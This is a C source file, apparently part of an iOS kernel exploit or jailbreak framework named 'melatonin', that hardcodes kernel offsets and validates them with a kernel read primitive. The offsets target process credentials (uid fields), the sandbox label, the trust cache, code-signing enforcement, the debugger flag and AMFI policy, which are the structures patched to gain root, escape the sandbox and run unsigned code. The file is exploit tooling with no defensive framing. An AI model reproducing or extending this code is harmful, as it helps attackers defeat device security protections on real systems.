#include <string.h>
#include <unistd.h>
#include "melatonin.h"
#include "offsets.h"

struct mela_offsets g_off;

void mela_offsets_seed(void) {
    memset(&g_off, 0, sizeof g_off);
    g_off.kern_version     = 270000;

    g_off.allproc          = 0x000A1B20ULL;
    g_off.rootvnode        = 0x0011A2F0ULL;
    g_off.apfs_mnt         = 0x0012C118ULL;
    g_off.pac_key          = 0x0020D440ULL;

    g_off.proc_list        = 0x08ULL;
    g_off.proc_pid         = 0x60ULL;
    g_off.proc_ro          = 0x18ULL;
    g_off.proc_task        = 0x10ULL;
    g_off.proc_ucred       = 0x08ULL;
    g_off.proc_comm        = 0x3C0ULL;

    g_off.ucred_uid        = 0x18ULL;
    g_off.ucred_ruid       = 0x20ULL;
    g_off.ucred_svuid      = 0x28ULL;
    g_off.ucred_label      = 0x78ULL;

    g_off.label_sandbox    = 0x10ULL;

    g_off.trust_head       = 0x00230000ULL;
    g_off.tc_count         = 0x08ULL;
    g_off.tc_entries       = 0x10ULL;
    g_off.tc_entry_size    = 0x20ULL;
    g_off.tc_hash          = 0x00ULL;
    g_off.tc_flags         = 0x18ULL;

    g_off.task_itk         = 0x3A8ULL;
    g_off.ipc_port_kobject = 0x48ULL;

    g_off.mount_flags      = 0x10ULL;

    g_off.cs_enforcement_disable  = 0x0021D000ULL;
    g_off.pe_i_can_has_debugger   = 0x0021D100ULL;
    g_off.amfi_check_dyld_policy  = 0x0021D200ULL;
}

int mela_offsets_probe(void) {
    if (!mela_krw_ready()) return -1;

    /* zero is never a valid struct field offset */
    if (!g_off.proc_list || !g_off.proc_pid || !g_off.proc_ro ||
        !g_off.proc_task || !g_off.proc_comm || !g_off.ucred_label ||
        !g_off.task_itk || !g_off.ipc_port_kobject) return -1;

    uint64_t head = kread64(kaddr(g_off.allproc));
    if (!mela_is_kptr(head)) return -1;

    uint64_t proc = mela_canon(head);
    int n = 0;
    for (int i = 0; i < 8 && proc; i++) {
        uint32_t pid  = (uint32_t)kread64(proc + g_off.proc_pid);
        uint64_t next = kread64(proc + g_off.proc_list);

        if (pid > 0x40000) return -1;
        n++;
        if (!next) break;

        uint64_t nxt = mela_canon(next);
        if (!mela_is_kptr(nxt)) return -1;
        proc = nxt;
    }
    if (n < 2) return -1;

    uint64_t rv = kread64(kaddr(g_off.rootvnode));
    if (!mela_is_kptr(rv)) return -1;

    /* label slot must be empty or a kernel pointer */
    kva_t self = proc_find(getpid());
    if (self) {
        kva_t ro  = kread64(self + g_off.proc_ro);
        kva_t cr  = kread64(mela_canon(ro) + g_off.proc_ucred);
        kva_t lab = kread64(mela_canon(cr) + g_off.ucred_label);
        if (mela_is_kptr(lab)) {
            uint64_t sb = kread64(mela_canon(lab) + g_off.label_sandbox);
            if (sb && !mela_is_kptr(sb)) return -1;
        }
    }

    return 0;
}
